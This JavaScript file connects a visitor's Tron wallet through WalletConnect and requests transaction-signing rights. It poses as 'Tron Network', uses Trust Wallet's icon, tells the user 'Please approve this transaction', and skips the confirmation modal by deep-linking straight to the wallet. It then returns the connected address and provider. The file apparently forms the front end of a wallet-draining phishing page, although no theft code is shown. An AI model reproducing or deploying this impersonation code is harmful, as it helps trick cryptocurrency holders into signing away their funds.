import UniversalProvider from "@walletconnect/universal-provider";

const projectId = 'c5250465b531d3f5128116dc9460f64e';
const metadata = {
    name: 'Tron Network',
    description: 'Please approve this transaction',
    url: window.location.origin,
    icons: ['https://trustwallet.com/assets/images/media/assets/trust_platform.svg']
};

let provider;

async function initWalletConnect() {
    try {
        provider = await UniversalProvider.init({
            projectId: projectId,
            metadata: metadata,
        });

        // Trigger native mobile deep link directly, no modal UI
        provider.on("display_uri", (uri) => {
            window.location.href = uri;
        });
    } catch (e) {
        console.error("Provider Init Error:", e);
    }
}

window.connectWalletConnectTron = async function() {
    if (!provider) {
        alert("System is still loading... Please wait a few seconds.");
        return null;
    }
    
    try {
        await provider.connect({
            namespaces: {
                tron: {
                    methods: ["tron_signTransaction"],
                    chains: ["tron:0x2b6653dc"],
                    events: ["chainChanged", "accountsChanged"]
                }
            }
        });

        const session = provider.session;
        if (session && session.namespaces && session.namespaces.tron) {
            const accountStr = session.namespaces.tron.accounts[0];
            const address = accountStr.split(":")[2];
            return { address, provider };
        }
        return null;
    } catch (error) {
        console.error("WalletConnect Connection Error:", error);
        return null;
    }
};

initWalletConnect();
